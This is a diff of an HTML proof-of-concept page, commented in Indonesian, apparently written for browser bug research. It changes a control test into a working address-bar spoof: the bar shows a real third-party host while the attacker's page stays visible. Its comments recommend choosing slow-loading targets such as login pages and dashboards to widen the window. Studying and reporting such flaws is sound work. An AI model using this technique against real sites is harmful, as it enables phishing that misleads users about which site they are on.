@@ -1,16 +1,41 @@
-<!-- 3 | LENGAN KONTROL untuk 1.html dan 2.html | [1-CLICK]
-     Sama persis TAPI port HIDUP (443) -> commit datang -> dokumen penyerang tertimpa halaman asli.
-     BACA HASILNYA BEGINI:
-       3 tertimpa halaman asli  = bagus, mekanisme 1/2 memang HOLD-nya yang bekerja
-       3 IKUT bertahan spoof    = kontrol GAGAL -> yang kamu lihat bukan mekanisme ini -> JANGAN dilapor
-     Tanpa file ini, angka 1 dan 2 tidak bisa dibaca. Jalankan selalu berpasangan. -->
-<button onclick="go()">Run kontrol 3</button>
-<p id=r></p>
+<!-- 3 | ⭐ VERSI YANG KAMU MINTA — bar menulis SITUS ORANG, layar menampilkan halaman KITA | [1-CLICK]
+     Ini 1.html yang diarahkan ke ORIGIN SUNGGUHAN, bukan ke file tetangga.
+     Mekanismenya sama: omnibox berganti saat COMMIT, piksel kita bertahan sampai situs tujuan
+     melukis frame pertamanya. Bedanya, sekarang yang tertulis di bar adalah host ORANG LAIN.
+     KENAPA INI BUKAN "TINGGAL PILIH google.com"  google.com melukis sangat cepat, jadi jendelanya
+     tipis. Yang menentukan bukan seberapa terkenal host-nya, tapi seberapa LAMBAT ia melukis.
+     Kandidat yang jendelanya lebar: halaman login berat, dashboard ber-JS besar, halaman
+     yang render-blocking, endpoint yang lambat menjawab, host yang TLS-nya lambat.
+     Jadi cara kerjanya: UKUR banyak host, lalu pakai yang jendelanya paling lebar.
+     ETIKA  hanya GET biasa ke halaman publik, satu kali, tanpa payload apa pun - persis
+     seperti membuka tab. Jangan diarahkan ke host yang tidak boleh kamu sentuh.
+     EXPECTED-SECURE  bar tidak berganti sampai dokumen tujuan melukis (jendela ~0 ms). -->
+<h2 style="font:20px system-ui">HALAMAN PENYERANG — perhatikan ini tetap terlihat</h2>
+<p style="font:13px system-ui">Isi host tujuan, klik, lalu <b>baca bar</b> sambil <b>melihat layar</b>.</p>
+<input id=u value="https://www.google.com/" style="width:340px;font:13px monospace">
+<button onclick="go()">Navigasi + ukur</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
-document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+g.textContent = 'REAL ORIGIN: ' + location.href;
 function go() {
-  var w = window.open('', '');
-  w.document.write('<h3>Kalau tulisan ini BERTAHAN, kontrol gagal &mdash; ' + location.origin + '</h3>');
-  setInterval(function () { w.location.replace('https://www.google.com/'); }, 9800);
+  var url = u.value.trim(); if (!/^https?:\/\//.test(url)) { g.textContent = 'harus http(s)://'; return; }
+  var t0 = performance.now(), painted = 0;
+  // pageshow/visibilitychange tidak cukup; yang menandai "kita masih di layar" adalah rAF kita
+  // masih dijalankan. Begitu dokumen tujuan mengambil alih, rAF kita berhenti.
+  var last = t0;
+  (function tick() { last = performance.now(); painted++; requestAnimationFrame(tick); })();
+  addEventListener('pagehide', function () {
+    try { sessionStorage.gap = Math.round(last - t0); } catch (e) { }
+  });
+  g.textContent = 'REAL ORIGIN: ' + location.origin + '\nmenavigasi ke ' + url +
+    '\n\nSAAT INI: baca bar + lihat layar. Kembali ke sini (Back) untuk melihat angkanya.';
+  setTimeout(function () { location.href = url; }, 60);
+}
+if (sessionStorage.gap) {
+  g.textContent = 'REAL ORIGIN: ' + location.href +
+    '\n\nJENDELA TERUKUR putaran lalu: ' + sessionStorage.gap + ' ms' +
+    '\n  = selama itu bar menulis host tujuan, layar masih halaman ini.' +
+    '\n\n>500 ms = lebar, layak dilapor. Ukur beberapa host, pakai yang paling lambat melukis.';
+  delete sessionStorage.gap;
 }
 </script>
